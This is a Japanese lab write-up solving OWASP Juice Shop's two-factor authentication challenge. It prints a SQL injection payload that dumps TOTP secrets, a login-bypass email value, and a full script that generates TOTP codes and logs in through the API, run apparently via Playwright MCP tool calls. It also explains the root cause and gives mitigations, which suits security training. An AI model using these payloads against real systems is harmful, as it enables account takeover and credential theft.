# Two Factor Authentication ✅

**難易度:** ⭐⭐⭐⭐⭐
**カテゴリ:** Broken Authentication
**目標:** wurstbrot ユーザーの2FA認証を突破してログインする (無効化やバイパスは不可)

## 思考プロセス

### 1. 2FAの仕組み

TOTP (Time-based One-Time Password) は:
1. ユーザーとサーバーが共有シークレットを持つ
2. 現在時刻 + シークレットから6桁のコードを生成
3. コードは30秒ごとに変化

**攻撃ポイント**: シークレットを入手できれば、正規のTOTPコードを生成可能

### 2. シークレットの抽出 (SQLi)

```sql
')) UNION SELECT id,email,password,totpSecret,5,6,7,8,9 FROM users WHERE totpSecret != ''--
```

**抽出結果:**
- Email: `wurstbrot@juice-sh.op`
- TOTP Secret: `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH`

### 3. TOTPコードの生成

Base32エンコードされたシークレットからHMAC-SHA1でTOTPを計算:

```javascript
// 1. Base32 → Hex 変換
// 2. 現在時刻 / 30 = カウンター
// 3. HMAC-SHA1(secret, counter) を計算
// 4. 最後のバイトでオフセット決定
// 5. 6桁のコードを抽出
```

### 4. ログイン

1. SQLi でパスワードをバイパス: `wurstbrot@juice-sh.op'--`
2. 2FA画面でTOTPコードを入力
3. ログイン成功

## 実行手順

### 方法: API 直接呼び出し (推奨)

```javascript
// browser_evaluate を使用
async () => {
  // TOTP生成関数
  function base32ToHex(base32) {
    const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
    let bits = '';
    for (let i = 0; i < base32.length; i++) {
      const val = alphabet.indexOf(base32[i].toUpperCase());
      if (val === -1) continue;
      bits += val.toString(2).padStart(5, '0');
    }
    let hex = '';
    for (let i = 0; i + 4 <= bits.length; i += 4) {
      hex += parseInt(bits.substring(i, i + 4), 2).toString(16);
    }
    return hex;
  }

  async function hmacSha1(key, message) {
    const cryptoKey = await crypto.subtle.importKey(
      'raw', key, { name: 'HMAC', hash: 'SHA-1' }, false, ['sign']
    );
    const signature = await crypto.subtle.sign('HMAC', cryptoKey, message);
    return new Uint8Array(signature);
  }

  async function generateTOTP(secret) {
    const hexSecret = base32ToHex(secret);
    const key = new Uint8Array(hexSecret.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));

    const epoch = Math.floor(Date.now() / 1000);
    let counter = Math.floor(epoch / 30);

    const counterBytes = new Uint8Array(8);
    for (let i = 7; i >= 0; i--) {
      counterBytes[i] = counter & 0xff;
      counter = counter >> 8;
    }

    const hmac = await hmacSha1(key, counterBytes);
    const offset = hmac[hmac.length - 1] & 0xf;
    const code = ((hmac[offset] & 0x7f) << 24 |
                  (hmac[offset + 1] & 0xff) << 16 |
                  (hmac[offset + 2] & 0xff) << 8 |
                  (hmac[offset + 3] & 0xff)) % 1000000;

    return code.toString().padStart(6, '0');
  }

  // Generate fresh TOTP
  const totp = await generateTOTP('IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH');

  // Login with SQLi to bypass password
  const loginRes = await fetch('/rest/user/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: "wurstbrot@juice-sh.op'--",
      password: "anything"
    })
  });

  const loginData = await loginRes.json();

  // If login needs 2FA, send the TOTP code
  if (loginData.status === 'totp_token_required') {
    const totpRes = await fetch('/rest/2fa/verify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        tmpToken: loginData.data.tmpToken,
        totpToken: totp
      })
    });

    const totpData = await totpRes.json();
    return { step: '2fa', totp, totpRes: totpData };
  }

  return { step: 'login', loginData, totp };
}
// 結果: { step: '2fa', totp: '961643', totpRes: { authentication: {...} } }
```

## コード/ペイロード

| 項目 | 値 |
|------|-----|
| Email | `wurstbrot@juice-sh.op'--` |
| TOTP Secret | `IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH` |
| 2FA Endpoint | `/rest/2fa/verify` |

## 解説

### 根本原因: TOTPシークレットの平文保存

2FAの安全性は「シークレットの秘匿」に完全に依存する。しかし、このアプリでは:

1. **平文でDB保存**: 暗号化されていない
2. **SQLiで抽出可能**: 他の脆弱性と組み合わせて攻撃
3. **シークレット漏洩 = 2FA無効化**

```
セキュアな実装:
  totpSecret → 暗号化 → DB保存

脆弱な実装:
  totpSecret → そのまま → DB保存
```

### 2FAの仕組みと攻撃

```
正規ユーザー:
  1. スマホアプリにシークレット登録
  2. アプリがTOTPを生成
  3. ログイン時にコードを入力

攻撃者:
  1. SQLiでシークレット抽出
  2. 同じアルゴリズムでTOTP生成
  3. 正規コードでログイン
```

シークレットさえあれば、攻撃者も正規のTOTPを生成できる。

### なぜ危険か

1. **シークレットは永続的**: パスワードと違い、変更されにくい
2. **漏洩に気づきにくい**: ログイン成功するため異常を検知しにくい
3. **バックアップ経由で漏洩**: シークレットのQRコードがスクショで残る

### 対策

```javascript
// 1. シークレットの暗号化保存
const encryptedSecret = await encrypt(totpSecret, masterKey);
await db.save({ totpSecret: encryptedSecret });

// 2. DB漏洩しても解読不能
// マスターキーは HSM やシークレットマネージャに

// 3. シークレットのログ出力禁止
// エラーログにも含めない
```

### SQLi と 2FA の組み合わせ攻撃

この攻撃は2つの脆弱性を組み合わせている:
1. **SQLi**: シークレット抽出
2. **平文保存**: 抽出したシークレットがそのまま使える

どちらか一方でも対策されていれば、攻撃は成功しない。

## Playwright MCP での実行

```javascript
// 1. TOTP シークレットを SQLi で抽出
mcp__playwright__browser_evaluate({
  function: `async () => {
    const res = await fetch("/rest/products/search?q=')) UNION SELECT id,email,password,totpSecret,5,6,7,8,9 FROM users WHERE totpSecret != ''--");
    return res.json();
  }`
});
// 結果に totpSecret: "IFTXE3SPOEYVURT2MRYGI52TKJ4HC3KH" が含まれる

// 2. TOTP 生成 + 2FA ログイン (上記のコード)
mcp__playwright__browser_evaluate({
  function: `async () => { /* TOTP生成 + ログイン */ }`
});

// 3. チャレンジ解決を確認
mcp__playwright__browser_evaluate({
  function: "() => fetch('/api/Challenges').then(r => r.json()).then(d => d.data.find(c => c.key === 'twoFactorAuthUnsafeSecretStorageChallenge'))"
});
```

### 重要なポイント

- **SQLi でシークレット抽出**: `totpSecret` カラムを UNION SELECT
- **TOTP 生成**: Web Crypto API で HMAC-SHA1 を実装
- **2段階ログイン**: まずパスワード (SQLi バイパス)、次に TOTP

## 参考リンク

- [Hacking OWASP's Juice Shop Pt. 58: Two Factor Authentication](https://curiositykillscolby.com/2020/12/23/pwning-owasps-juice-shop-pt-58-two-factor-authentication/)
- [OWASP Multifactor Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html)
- [RFC 6238 - TOTP](https://datatracker.ietf.org/doc/html/rfc6238)

## ステータス

- [x] SQLi で TOTP シークレット抽出
- [x] TOTP コード生成アルゴリズム実装
- [x] SQLi でパスワードバイパス
- [x] 2FA ログイン成功
